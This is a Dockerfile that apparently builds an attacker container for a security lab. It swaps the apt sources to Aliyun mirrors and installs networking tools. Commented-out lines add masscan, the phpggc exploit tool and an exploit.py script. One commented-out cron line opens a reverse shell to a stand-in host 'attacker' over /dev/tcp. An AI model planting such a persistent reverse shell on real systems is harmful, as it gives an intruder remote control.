FROM ubuntu:18.04

# 替换镜像源
RUN apt-get update && apt-get install -y ca-certificates && \
    cp /etc/apt/sources.list /etc/apt/sources.list.bak && \
    sed -i 's#deb.debian.org#mirrors.aliyun.com#g' /etc/apt/sources.list && \
    sed -i 's#archive.ubuntu.com#mirrors.aliyun.com#g' /etc/apt/sources.list && \
    sed -i 's#security.debian.org#mirrors.aliyun.com#g' /etc/apt/sources.list && \
    sed -i 's#security.ubuntu.com#mirrors.aliyun.com#g' /etc/apt/sources.list && \
    sed -i 's#http:#https:#g' /etc/apt/sources.list && apt-get update
# Install dependencies
RUN apt-get install -y net-tools iputils-ping cron wget curl
# RUN apt-get install -y git python3 python3-pip masscan libpcap-dev openssh-client php
# RUN pip3 install requests -i https://mirrors.aliyun.com/pypi/simple/ && \
    # git clone https://github.com/ambionics/phpggc.git

# 定时任务
# RUN echo 'nohup bash -c "bash -i >& /dev/tcp/attacker/2333 0>&1" &' | crontab -
# RUN echo '* * * * * echo "1" >> ~/lastcmd' | crontab -


# 攻击脚本
# COPY exploit.py .

CMD ["sleep", "infinity"]
# CMD ["service", "cron", "start"]
